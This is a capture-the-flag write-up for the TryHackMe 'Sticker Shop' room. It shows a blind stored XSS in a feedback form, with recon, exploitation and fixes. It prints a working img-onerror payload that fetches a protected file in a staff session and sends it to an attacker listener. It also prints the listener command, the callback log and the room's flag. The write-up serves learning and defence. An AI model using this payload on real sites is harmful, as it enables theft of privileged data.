# The Sticker Shop — TryHackMe Writeup

**Author:** Obito Uchiha — Team AKATSUKI
**Category:** Web Exploitation (Blind XSS)
**Target:** `10.49.130.61`
**Difficulty:** Beginner

---

## 1. Objective

Retrieve the contents of a protected flag file served at:

```
http://10.49.130.61:8080/flag.txt
```

Direct access to this endpoint returns `401 Unauthorized`, so the flag must be exfiltrated indirectly through an authenticated session — in this case, a staff member reviewing user-submitted feedback.

---

## 2. Reconnaissance

An Nmap scan of the target revealed two open ports:

```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 62
```

- **22/tcp** — SSH, not relevant to this attack path.
- **8080/tcp** — Web application (The Sticker Shop storefront).

Browsing to the app on port 8080 reveals a sticker storefront with a customer feedback submission feature at:

```
http://10.49.130.61:8080/submit_feedback
```

Attempting to access the flag directly confirms it is access-controlled:

```
GET http://10.49.130.61:8080/flag.txt
→ 401 Unauthorized
```

This strongly implies the flag is only reachable from a privileged/internal context — i.e., it will succeed if fetched from inside a staff member's authenticated browser session.

---

## 3. Vulnerability Analysis

The `/submit_feedback` endpoint accepts free-text (and HTML) input from any visitor and stores it for later review. Submissions are rendered — without sanitization — in a staff-facing review dashboard. This is a textbook **Blind Stored XSS**:

- "Blind" because the attacker never sees the execution happen directly; it fires asynchronously in a staff member's browser.
- "Stored" because the payload persists in the backend and is replayed every time staff load the review panel.

Since the staff dashboard runs in the *same origin* as `http://10.49.130.61:8080`, any JavaScript injected via feedback executes with the staff session's privileges — including the ability to successfully request `/flag.txt`, which is blocked for anonymous/external requests.

---

## 4. Exploitation

### Step 1 — Stand up a listener

On the attacking machine, a simple Python HTTP server is used to catch the exfiltrated data:

```bash
python3 -m http.server 8888
```

### Step 2 — Craft the Blind XSS payload

The payload uses a broken `<img>` tag's `onerror` handler to execute JavaScript. It fetches the protected flag using the staff member's authenticated session, then forwards the content to the attacker's listener via a cross-origin GET request:

```html
<img src="invalid-image" onerror="fetch('/flag.txt').then(r => r.text()).then(data => fetch('http://<YOUR_IP>:8888/?flag=' + encodeURIComponent(data)))">
```

- `src="invalid-image"` deliberately fails to load, guaranteeing `onerror` fires.
- `fetch('/flag.txt')` — a relative-path request, so it inherits the staff browser's session/origin and succeeds where the attacker's own direct request failed.
- The flag content is URL-encoded and appended as a query parameter to a `fetch()` call aimed at the attacker's listener, exfiltrating the data out-of-band.

### Step 3 — Submit the payload

The payload is submitted through the feedback form at `/submit_feedback`. The application responds:

```
Thanks for your feedback! It will be evaluated shortly by our staff
```

This confirms the submission was stored and queued for staff review — the trigger condition for the blind XSS.

### Step 4 — Capture the callback

After a short wait, a staff member (or automated reviewer bot) opens the submission in their dashboard, executing the injected script. The listener receives the exfiltrated flag:

```
10.49.130.61 - - [06/Nov/2026 01:49:01] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```

URL-decoding the flag parameter yields:

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

## 5. Root Cause & Fix

| Issue | Recommendation |
|---|---|
| Unsanitized user input rendered in staff dashboard | HTML-encode all user-submitted content before rendering (e.g., escape `<`, `>`, `"`, `'`) |
| No Content Security Policy (CSP) | Deploy a strict CSP to block inline event handlers and restrict `fetch`/`connect-src` origins |
| Staff session shares origin with public-facing app | Isolate the admin/review panel on a separate origin or subdomain with stricter session controls |
| `/flag.txt` relies on implicit session trust | Enforce explicit authorization checks, not just "is this request same-origin" |

---

## 6. Flag

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

*Writeup by Obito Uchiha — Team AKATSUKI*
